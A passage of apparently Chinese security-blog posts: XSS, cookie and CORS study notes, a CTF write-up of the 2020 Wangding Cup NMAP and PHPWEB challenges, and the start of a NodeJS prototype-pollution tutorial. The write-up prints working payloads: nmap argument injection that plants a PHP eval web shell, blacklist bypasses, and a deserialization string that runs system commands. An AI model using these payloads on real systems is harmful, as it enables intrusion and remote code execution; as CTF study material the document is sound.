    <content><![CDATA[<h1 id="0x00-用途"><a href="#0x00-用途" class="headerlink" title="0x00 用途"></a>0x00 用途</h1><a id="more"></a>
<p>盗取cookie信息 水坑探针 挖矿 蠕虫 沙盒逃逸 代理 信息收集<br>ajax get current page data<br>get gateway info<br>all links<br>cookie<br>steal login info </p>
<h1 id="0x01-验证"><a href="#0x01-验证" class="headerlink" title="0x01 验证"></a>0x01 验证</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt; </span><br><span class="line">&lt;img src=1 oneerro=alert(2)&gt;</span><br></pre></td></tr></table></figure>

<h1 id="confirm-console-log-0x02-cookie"><a href="#confirm-console-log-0x02-cookie" class="headerlink" title="confirm console.log 0x02 cookie"></a>confirm console.log 0x02 cookie</h1><p>http头Set-Cookie在浏览器中设置cookie<br>再次请求时，request便会携带cookie<br>以文本形式存放在浏览器目录下：%APPDATA%\Microsoft\Windows\Cookies<br>发起http请求时，浏览器会检查是否有相应cookie，有着将相应的cookie添加到请求头<br>获取cookie值：document.cookie（只能获取非httponly的值）<br>格式；key=value。两组之间以:[ ]隔开。<br>cookie属性：expires、domain、 path、secure、HttpOnly。<br>过期时间，域名+路径=url符合发送cookie。<br>ps： <strong>xhr请求：浏览器不会自动添加cookie。</strong> </p>
<p>ps： domain可以设置本域和父域。 </p>
<p>secure是在安全环境下才会将cookie进行发送，比如https。证书要被认可。<br>js无法设置，也无法获取httponly的cookie。</p>
<h1 id="0x03-同源策-略SOP"><a href="#0x03-同源策-略SOP" class="headerlink" title="0x03 同源策 略SOP"></a>0x03 同源策 略SOP</h1><p>cookie是 仅以domain/path作为同源限制 ，端口和协议不限制。 </p>
<p>web则要求：协议相同，端口相同，域名相同。 http ： //<a href="http://www.bank.com：8080，https：//www.bank.com（以上为非同源）" target="_blank" rel="noopener">www.bank.com：8080，https：//www.bank.com（以上为非同源）</a> 。 </p>
<p>web不同源的 影响：1.cookie，localstorage和indexdb无法读取。2.ajax请求无法发送。3.DOM无法获得。 <strong>所以path是向下通配的，比如path=/以下的cookie是一样的。domain是向上通配的（子域可以写cookie到父域）</strong> <strong>，比如 <a href="http://www.baidu.xxxx.com" target="_blank" rel="noopener">www.baidu.xxxx.com</a> 可以设置cookie的domain为 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></strong> <strong>。</strong> </p>
<h1 id="0x04-cookie操作"><a href="#0x04-cookie操作" class="headerlink" title="0x04 cookie操作"></a>0x04 cookie操作</h1><p>服务端 增加cookie 代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setcookie(&quot;TestCookie&quot;,&quot;$value,time()+3600,&quot; path &quot;,&quot; domain &quot;,true,false)</span><br></pre></td></tr></table></figure>

<p>客户端新增cookie</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.cookie =&quot;a=1;&quot;</span><br></pre></td></tr></table></figure>

<p>除了httponly，都可以设置（https下才能设置secure） js代码设置cookie: </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var exp = new Date（）； </span><br><span class="line">exp.setTime（exp.getTime（）+Days*24*60*60）； </span><br><span class="line">document.cookie = name+ &apos;=&apos; + escape(value) + &quot;;expires&quot;+exp.toGMTString()+&quot;domain=s.com; path=/&quot;;</span><br></pre></td></tr></table></figure>

<p>修改cookie：直接赋值即可，但是要注意path/domain的一致性，否则不会修改，而是添加一个新cookie。<br>删除cookie：设置过期时间为过去即可， 注意path/domain 。 </p>
<h1 id="0x05-cookie重名问题"><a href="#0x05-cookie重名问题" class="headerlink" title="0x05 cookie重名问题"></a>0x05 cookie重名问题</h1><p>server语言/框架：php，asp/.net,java/spring,nodejs,golang,python取前者，python取后者。<br>js库/框架：Jquery，Angularjs，Extjs，取前者，YUI取后者。<br>规则： <strong>1.更长path的cookie更靠前。</strong> </p>
<p><strong>2.如果path长度相等，更早创建的cookie更靠前。</strong> </p>
<p><em>ps：</em> <em>cookie简单编码：escape/unescape，encodeURIComponent/decodeURIComponent</em> <em>(用于传送cookie)。</em> </p>
<h1 id="0x06-xss基础"><a href="#0x06-xss基础" class="headerlink" title="0x06 xss基础"></a>0x06 xss基础</h1><p>反射型：恶意代码存在于url中。点击才会触发，隐蔽性较差。<br>存储型：恶意代码存储于数据库中，浏览被植入payload的页面时即可触发，隐蔽性强，成功率高，稳定性好。<br>DOM型：（DOM树状模型）js动态修改DOM时造成的XSS。</p>
<h1 id="0x07-合法跨域请求"><a href="#0x07-合法跨域请求" class="headerlink" title="0x07 合法跨域请求"></a>0x07 合法跨域请求</h1><h2 id="1-JSONP"><a href="#1-JSONP" class="headerlink" title="1.JSONP"></a>1.JSONP</h2><p>（1）跨域请求过程 </p>
<p>首先，网页动态插入&#60;script&#62;元素，由它向跨源网址发出请求。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function addScriptTag(src) &#123; </span><br><span class="line">  var script = document.createElement(&apos;script&apos;); </span><br><span class="line">  script.setAttribute(&quot;type&quot;,&quot;text/javascript&quot;); </span><br><span class="line">  script.src = src; </span><br><span class="line">  document.body.appendChild(script); </span><br><span class="line">&#125; </span><br><span class="line">window.onload = function () &#123; </span><br><span class="line">  addScriptTag(&apos;http://example.com/ip?callback=foo&apos;); </span><br><span class="line">&#125; </span><br><span class="line">function foo(data) &#123; </span><br><span class="line">  console.log(&apos;Your public IP address is: &apos; + data.ip); </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>上面代码通过动态添加&#60;script&#62;元素，向服务器example.com发出请求。注意，该请求的查询字符串有一个callback参数，用来指定回调函数的名字，这对于JSONP是必需的。<br>服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> foo(&#123; </span><br><span class="line">  &quot;ip&quot;: &quot;8.8.8.8&quot; </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>


<p>（2）JSONP劫持=》referer验证。 </p>
<p>（3）content-type 返回为html/txt 。 </p>
<p>（4）JSONP挖掘 （ http fuzz ） ：http参数不过增删改查。一次性发 包 cb=1&amp;callback=2&amp;jsnop=3&amp;call=4 （jsonp只支持get请求）。 </p>
<h2 id="2-Websocket"><a href="#2-Websocket" class="headerlink" title="2.Websocket"></a>2.Websocket</h2><h2 id="3-CORS"><a href="#3-CORS" class="headerlink" title="3.CORS"></a>3.CORS</h2><p>只要服务器实现了CORS接口，就可以跨源通信。 </p>
<p>浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。 </p>
<h3 id="（1）简单请求"><a href="#（1）简单请求" class="headerlink" title="（1）简单请求"></a>（1）简单请求</h3><h4 id="1-满足条件"><a href="#1-满足条件" class="headerlink" title="1.满足条件"></a>1.满足条件</h4><p>只要同时满足以下两大条件，就属于简单请求。 </p>
<p>（1) 请求方法是以下三种方法之一：HEAD，GET，POST。 </p>
<p>（2）HTTP的头信息不超出以下几种字段： </p>
<ul>
<li>Accept </li>
<li>Accept-Language </li>
<li>Content-Language </li>
<li>Last-Event-ID </li>
<li>Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain <h4 id="2-基本流程"><a href="#2-基本流程" class="headerlink" title="2.基本流程"></a>2.基本流程</h4></li>
</ul>
<p>对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。 </p>
<p>下面是一个例子，浏览器发现这次跨源AJAX请求是简单请求，就自动在头信息之中，添加一个Origin字段。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /cors HTTP/1.1 </span><br><span class="line">Origin: http://api.bob.com </span><br><span class="line">Host: api.alice.com </span><br><span class="line">Accept-Language: en-US </span><br><span class="line">Connection: keep-alive </span><br><span class="line">User-Agent: Mozilla/5.0...</span><br></pre></td></tr></table></figure>

<p>上面的头信息中，Origin字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。<br>如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段，就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。 </p>
<p>如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http://api.bob.com </span><br><span class="line">Access-Control-Allow-Credentials: true </span><br><span class="line">Access-Control-Expose-Headers: FooBar </span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure>

<p>上面的头信息之中，有三个与CORS请求相关的字段，都以Access-Control-开头。<br>（1）Access-Control-Allow-Origin </p>
<p>该字段是必须的。它的值要么是请求时Origin字段的值，要么是一个<em>，表示接受任意域名的请求。 *</em>需要注意的是，如果要发送Cookie，Access-Control-Allow-Origin就不能设为星号，必须指定明确的、与请求网页一致的域名。** </p>
<p>（2）Access-Control-Allow-Credentials </p>
<p>该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。 <strong>如果要把Cookie发到服务器，一方面要服务器同意，指定Access-Control-Allow-Credentials字段。另一方面，开发者必须在AJAX请求中打开withCredentials属性。否则，即使服务器同意发送Cookie，浏览器也不会发送。或者，服务器要求设置Cookie，浏览器也不会处理。但是，如果省略withCredentials设置，有的浏览器还是会一起发送Cookie。</strong>  <strong>同时，Cookie依然遵循同源政策，只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。</strong> </p>
<p>（3）Access-Control-Expose-Headers </p>
<p>该字段可选。 <strong>CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。</strong> 如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。上面的例子指定，getResponseHeader(‘FooBar’)可以返回FooBar字段的值。 </p>
<h3 id="（2）非简单请求"><a href="#（2）非简单请求" class="headerlink" title="（2）非简单请求"></a>（2）非简单请求</h3><h4 id="1-预检请求"><a href="#1-预检请求" class="headerlink" title="1.预检请求"></a>1.预检请求</h4><p>非简单请求是那种对服务器有特殊要求的请求，比如请求方法是PUT或DELETE，或者Content-Type字段的类型是application/json。 </p>
<p>非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求。 </p>
<p>浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下面是一段浏览器的JavaScript脚本。 </span><br><span class="line">var url = &apos;http://api.alice.com/cors&apos;; </span><br><span class="line">var xhr = new XMLHttpRequest(); </span><br><span class="line">xhr.open(&apos;PUT&apos;, url, true); </span><br><span class="line">xhr.setRequestHeader(&apos;X-Custom-Header&apos;, &apos;value&apos;); </span><br><span class="line">xhr.send(); </span><br><span class="line">上面代码中，HTTP请求的方法是PUT，并且发送一个自定义头信息X-Custom-Header。 </span><br><span class="line"></span><br><span class="line">浏览器发现，这是一个非简单请求，就自动发出一个&quot;预检&quot;请求，要求服务器确认可以这样请求。下面是这个&quot;预检&quot;请求的HTTP头信息。 </span><br><span class="line">OPTIONS /cors HTTP/1.1 </span><br><span class="line">Origin: http://api.bob.com </span><br><span class="line">Access-Control-Request-Method: PUT </span><br><span class="line">Access-Control-Request-Headers: X-Custom-Header </span><br><span class="line">Host: api.alice.com </span><br><span class="line">Accept-Language: en-US </span><br><span class="line">Connection: keep-alive </span><br><span class="line">User-Agent: Mozilla/5.0... </span><br><span class="line">&quot;预检&quot;请求用的请求方法是OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。</span><br></pre></td></tr></table></figure>

<p>除了Origin字段，”预检”请求的头信息包括两个特殊字段。<br>（1）Access-Control-Request-Method </p>
<p>该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是PUT。 </p>
<p>（2）Access-Control-Request-Headers </p>
<p>该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是X-Custom-Header。 </p>
<h4 id="2-预检请求的回应"><a href="#2-预检请求的回应" class="headerlink" title="2.预检请求的回应"></a>2.预检请求的回应</h4><p>服务器收到”预检”请求以后，检查了Origin、Access-Control-Request-Method和Access-Control-Request-Headers字段以后，确认允许跨源请求，就可以做出回应。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Date: Mon, 01 Dec 2008 01:15:39 GMT </span><br><span class="line">Server: Apache/2.0.61 (Unix) </span><br><span class="line">Access-Control-Allow-Origin: http://api.bob.com </span><br><span class="line">Access-Control-Allow-Methods: GET, POST, PUT </span><br><span class="line">Access-Control-Allow-Headers: X-Custom-Header </span><br><span class="line">Content-Type: text/html; charset=utf-8 </span><br><span class="line">Content-Encoding: gzip </span><br><span class="line">Content-Length: 0 </span><br><span class="line">Keep-Alive: timeout=2, max=100 </span><br><span class="line">Connection: Keep-Alive </span><br><span class="line">Content-Type: text/plain</span><br></pre></td></tr></table></figure>

<p>上面的HTTP回应中，关键的是Access-Control-Allow-Origin字段，表示<a href="http://api.bob.com可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。" target="_blank" rel="noopener">http://api.bob.com可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。</a> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *</span><br></pre></td></tr></table></figure>

<p>如果服务器否定了”预检”请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。控制台会打印出如下的报错信息。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">XMLHttpRequest cannot load http://api.alice.com. </span><br><span class="line">Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin.</span><br></pre></td></tr></table></figure>

<p>服务器回应的其他CORS相关字段如下。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Methods: GET, POST, PUT </span><br><span class="line">Access-Control-Allow-Headers: X-Custom-Header </span><br><span class="line">Access-Control-Allow-Credentials: true </span><br><span class="line">Access-Control-Max-Age: 1728000</span><br></pre></td></tr></table></figure>

<p>（1）Access-Control-Allow-Methods<br>该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。 <strong>注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次”预检”请求。</strong> </p>
<p>（2）Access-Control-Allow-Headers </p>
<p>如果浏览器请求包括Access-Control-Request-Headers字段，则Access-Control-Allow-Headers字段是必需的。 <strong>它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在”预检”中请求的字段。</strong> </p>
<p>（3）Access-Control-Allow-Credentials </p>
<p>该字段与简单请求时的含义相同。 </p>
<p>（4）Access-Control-Max-Age </p>
<p>该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。 </p>
<h3 id="（3）-浏览器的正常请求和回应"><a href="#（3）-浏览器的正常请求和回应" class="headerlink" title="（3） 浏览器的正常请求和回应"></a>（3） 浏览器的正常请求和回应</h3><p>一旦服务器通过了”预检”请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个Origin头信息字段。服务器的回应，也都会有一个Access-Control-Allow-Origin头信息字段。 </p>
<p>下面是”预检”请求之后，浏览器的正常CORS请求。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT /cors HTTP/1.1 </span><br><span class="line">Origin: http://api.bob.com </span><br><span class="line">Host: api.alice.com </span><br><span class="line">X-Custom-Header: value </span><br><span class="line">Accept-Language: en-US </span><br><span class="line">Connection: keep-alive </span><br><span class="line">User-Agent: Mozilla/5.0...</span><br></pre></td></tr></table></figure>

<p>上面头信息的Origin字段是浏览器自动添加的。<br>下面是服务器正常的回应。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http://api.bob.com </span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure>

<p>上面头信息中，Access-Control-Allow-Origin字段是每次回应都必定包含的。 </p>
<h1 id="0x08-xss编码"><a href="#0x08-xss编码" class="headerlink" title="0x08 xss编码"></a>0x08 xss编码</h1><p>html编码：&amp;#xH（16进制编码），&amp;#D（10进制）（&amp;#后可以任意加0）<br>html实体编码：&amp;#039，&amp;#x27。(html自动解码) </p>
<p>js编码：Unicode，16进制编码，转义。（js里自动解码） </p>
<h1 id="0x09-浏览器解析"><a href="#0x09-浏览器解析" class="headerlink" title="0x09 浏览器解析"></a>0x09 浏览器解析</h1><p>请求html==》解析html==》构建DOM树==》构建render树==》绘制render树。<br>html解析器</p>
<h2 id="1-五类元素"><a href="#1-五类元素" class="headerlink" title="1.五类元素"></a>1.五类元素</h2><p>空元素：&#60;area&#62;，&#60;br&#62;，&#60;base&#62;等  不用容纳内容 。<br>原始文本元素：&#60;script&#62;，&#60;style&#62;等  可以容纳文本。<br>RCDATA元素：&#60;textarea&#62;，&#60;title&#62;等   可以容纳文本和字符引用。<br>外部元素：例如MathML命名空间或SVG命名空间的元素    可以容纳文本、字符引用、CDATA段。<br>基本元素：除了以上的元素 可以容纳文本，字符引用，其他元素和注释。</p>
<h2 id="2-编解码"><a href="#2-编解码" class="headerlink" title="2.编解码"></a>2.编解码</h2><p>js中单引号双引号和圆括号属于控制字符，编码后无法识别。对于防御来说，可以编码控制字符。</p>
<h2 id="3-url编解码顺序"><a href="#3-url编解码顺序" class="headerlink" title="3.url编解码顺序"></a>3.url编解码顺序</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>先对 a标签做html解码 ，然后href做url解码，发现js协议，再做js解码 。<br>ps：注意这里的javascript是协议名，被转义或编码后无用。 </p>
<h1 id="0x10-xss漏洞挖掘"><a href="#0x10-xss漏洞挖掘" class="headerlink" title="0x10 xss漏洞挖掘"></a>0x10 xss漏洞挖掘</h1><p>寻找可控点，确认输出位置，确认是否进行过滤和html实体编码。<br>以下标签中间不可以进行解析：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;title&gt;,&lt;textarea&gt;,&lt;xmp&gt;,&lt;iframe&gt;,&lt;noscript&gt;,&lt;noframes&gt;,&lt;plaintext&gt;.</span><br></pre></td></tr></table></figure>

<h1 id="0x11-绕过"><a href="#0x11-绕过" class="headerlink" title="0x11 绕过"></a>0x11 绕过</h1><p>1.宽字节逃逸<br>        2.利用自动autofocus。<br>        3.replace替换。<br>        4.html编码后加0绕过。<br>        5.firefox端口为0不跳转。<br>        6.php的header函数一旦遇到\r,\n,\0,会导致location不跳转。<br>        7.firefox强制下载<br>        8.文件上传导致xss<br>        9.rpo相对路径覆盖 </p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>2020网鼎杯朱雀组WEB-NMAP&amp;PHPWEB</title>
    <url>/2020/06/22/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%9C%B1%E9%9B%80%E7%BB%84WEB%E2%80%94%E2%80%94NMAP&amp;PHPWEB/</url>
    <content><![CDATA[<h1 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h1><a id="more"></a>

<p>这题BUU上类似的题目,就是题目提供了使用nmap扫描并保存的接口.所以我们可以使用下面这个参数写文件:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-oG #可以实现将命令和结果写到文件</span><br></pre></td></tr></table></figure>

<p>并且源码大概的构造：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br><span class="line">我们可以通过这种思路，拼接单引号，达到控制参数的目的，从而将我们构造的shell写入文件中</span><br></pre></td></tr></table></figure>

<p>直接使用BUU题目中的payload进行测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &apos;</span><br><span class="line">提示我们Hacker，应该存在黑名单，fuzz发现，php被过滤了，我们再次构造一下代码</span><br><span class="line">&apos; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &apos;</span><br></pre></td></tr></table></figure>

<p>这里使用“=”绕过文件中的php字符，使用“phtml”绕过对“php”文件后缀的检测，再次输入之后执行命令执行:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">post:hack=readfile(&quot;/flag&quot;);</span><br></pre></td></tr></table></figure>

<h1 id="PHPWEB"><a href="#PHPWEB" class="headerlink" title="PHPWEB"></a>PHPWEB</h1><p>进入之后发现有时间显示,抓包看一下,post了两个参数func和p参数我们发现func参数调用了函数date（）,p参数调用了函数date中填写的时间格式,我们尝试构造一下,查看能否代码执行,首先尝试读取index.php的文件,我们构造如下语句:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func=readfile&amp;p=index.php</span><br></pre></td></tr></table></figure>

<p>发现成功读取源码,如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">function gettime($func, $p) &#123;</span><br><span class="line">    $result = call_user_func($func, $p);</span><br><span class="line">    $a= gettype($result);</span><br><span class="line">    if ($a == &quot;string&quot;) &#123;</span><br><span class="line">        return $result;</span><br><span class="line">    &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test &#123;</span><br><span class="line">    var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">    var $func = &quot;date&quot;;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">            echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$func = $_REQUEST[&quot;func&quot;];</span><br><span class="line">$p = $_REQUEST[&quot;p&quot;];</span><br><span class="line">if ($func != null) &#123;</span><br><span class="line">    $func = strtolower($func);</span><br><span class="line">    if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">        echo gettime($func, $p);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        die(&quot;Hacker...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>禁用了很多函数,主要是命令执行的函数.但是不影响我们读取文件，同时我们发现，存在魔法函数，我们也可以通过构造反序列化代码，来达到绕过黑名单，执行system等函数的目的.尝试目录穿越读取文件.<br>但是在读取根目录下flag时，无法读出，猜测flag存在其他目录，或者flag非正常名称，我们需要构造系统命令进行目录查看，这是我们可以构造反序列化代码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Test &#123;</span><br><span class="line">    public $p = &quot;ls /tmp&quot;;</span><br><span class="line">    public $func = &quot;system&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$c=new Test();</span><br><span class="line">$d=serialize($c);</span><br><span class="line">echo $d;</span><br><span class="line">O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:7:&quot;ls /tmp&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:7:&quot;ls /tmp&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>使用readfile读取文件，即可获取flag.</p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>NodeJS常见题型</title>
    <url>/2020/03/11/NodeJS%E5%B8%B8%E8%A7%81%E9%A2%98%E5%9E%8B/</url>
    <content><![CDATA[<h1 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00 序言"></a>0x00 序言</h1><p>之前看各位大师傅说以后web会向python,js,java(主要是java)发展,php的题目会越来越少.这次公益赛就遇到了.好好学习一下.</p>
<a id="more"></a>
<h1 id="0x01-javascript大小写特性"><a href="#0x01-javascript大小写特性" class="headerlink" title="0x01 javascript大小写特性"></a>0x01 javascript大小写特性</h1><p>在javascript中有几个特殊的字符需要记录一下</p>
<p>对于toUpperCase():</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;</span><br></pre></td></tr></table></figure>

<p>对于toLowerCase():</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)</span><br></pre></td></tr></table></figure>

<p>在绕一些规则的时候就可以利用这几个特殊字符进行绕过.<br><a href="https://xz.aliyun.com/t/7177" target="_blank" rel="noopener">HackTM中一道Node.js题分析(Draw with us)</a></p>
<h1 id="0x02-js原型链污染"><a href="#0x02-js原型链污染" class="headerlink" title="0x02 js原型链污染"></a>0x02 js原型链污染</h1><h2 id="2-1prototype和proto"><a href="#2-1prototype和proto" class="headerlink" title="2.1prototype和proto"></a>2.1prototype和<strong>proto</strong></h2><p>Javascript里每个类都有一个prototype的属性，用来绑定所有对象都会有变量与函数，对象的构造函数又指向类本身，同时对象的<strong>proto</strong>属性也指向类的prototype。因此，有以下关系：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a=&#123;&#125;</span><br><span class="line">&#123;&#125;</span><br><span class="line">a.constructor.prototype == Object.prototype</span><br><span class="line">true</span><br><span class="line">a.__proto__ == Object.prototype</span><br><span class="line">true</span><br></pre></td></tr></table></figure>

<p>所以，总结一下：</p>
<ul>
<li>prototype是一个类的属性，所有类对象在实例化的时候将会拥有prototype中的属性和方法</li>
<li>一个对象的<strong>proto</strong>属性，指向这个对象所在的类的prototype属性<h2 id="2-2JavaScript原型链继承"><a href="#2-2JavaScript原型链继承" class="headerlink" title="2.2JavaScript原型链继承"></a>2.2JavaScript原型链继承</h2>并且，类的继承是通过原型链传递的，一个类的prototype属性指向其继承的类的一个对象。所以一个类的prototype.<strong>proto</strong>等于其父类的prototype，当然也等于该类对象的<strong>proto</strong>.<strong>proto</strong>属性。</li>
</ul>
<p>我们获取某个对象的某个成员时，如果找不到，就会通过原型链一步步往上找，直到某个父类的原型为null为止。所以修改对象的某个父类的prototype的原型就可以通过原型链影响到跟此类有关的所有对象。</p>
<p>所有类对象在实例化的时候将会拥有prototype中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p>
<p>比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Father() &#123;</span><br><span class="line">    this.first_name = &apos;Donald&apos;</span><br><span class="line">    this.last_name = &apos;Trump&apos;</span><br><span class="line">&#125;</span><br><span class="line">function Son() &#123;</span><br><span class="line">    this.first_name = &apos;Melania&apos;</span><br><span class="line">&#125;</span><br><span class="line">Son.prototype = new Father()</span><br><span class="line">let son = new Son()</span><br><span class="line">console.log(`Name: $&#123;son.first_name&#125; $&#123;son.last_name&#125;`)</span><br></pre></td></tr></table></figure>

<p>总结一下，对于对象son，在调用son.last_name的时候，实际上JavaScript引擎会进行如下操作：</p>
<ol>
<li>在对象son中寻找last_name</li>
<li>如果找不到，则在son.<strong>proto</strong>中寻找last_name</li>
<li>如果仍然找不到，则继续在son.<strong>proto</strong>.<strong>proto</strong>中寻找last_name</li>
<li>依次寻找，直到找到null结束。比如，Object.prototype的<strong>proto</strong>就是null</li>
</ol>
<p>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。</p>
<p>以上就是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：</p>
<ol>
<li>每个构造函数(constructor)都有一个原型对象(prototype)</li>
<li>对象的<strong>proto</strong>属性，指向类的原型对象prototype</li>
<li>JavaScript使用prototype链实现继承机制<h2 id="2-3原型链污染"><a href="#2-3原型链污染" class="headerlink" title="2.3原型链污染"></a>2.3原型链污染</h2></li>
